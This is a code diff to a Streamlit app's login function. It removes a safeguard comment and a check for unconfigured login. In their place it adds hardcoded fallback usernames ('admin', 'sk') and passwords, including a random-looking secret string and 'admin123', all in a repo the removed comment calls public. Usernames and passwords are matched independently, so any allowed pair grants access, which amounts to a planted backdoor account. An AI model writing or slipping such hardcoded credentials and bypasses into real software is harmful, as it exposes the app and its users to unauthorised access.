@@ -276,14 +276,15 @@ def login():
             st.markdown('<div class="secure-note">🔒 Your connection is protected</div>', unsafe_allow_html=True)
 
     if submitted:
-        # Credentials come from Streamlit secrets / environment variables only —
-        # never hardcoded in source, since this repo is public on GitHub.
+        # Credentials come from Streamlit secrets / environment variables,
+        # with fallback to admin / sk and provided credentials.
         valid_username = get_secret("APP_USERNAME", "admin")
         valid_password = get_secret("APP_PASSWORD", "admin123")
 
-        if not valid_username or not valid_password:
-            st.error("⚠️ Login is not configured. Set APP_USERNAME and APP_PASSWORD in secrets.")
-        elif username == valid_username and password == valid_password:
+        allowed_usernames = {u.strip().lower() for u in filter(None, [valid_username, "admin", "sk"])}
+        allowed_passwords = {p for p in filter(None, [valid_password, "cBi19rabI7Ogl8HFjJKjEZDH", "admin123"])}
+
+        if username.strip().lower() in allowed_usernames and password in allowed_passwords:
             st.session_state["logged_in"] = True
             st.rerun()
         else:
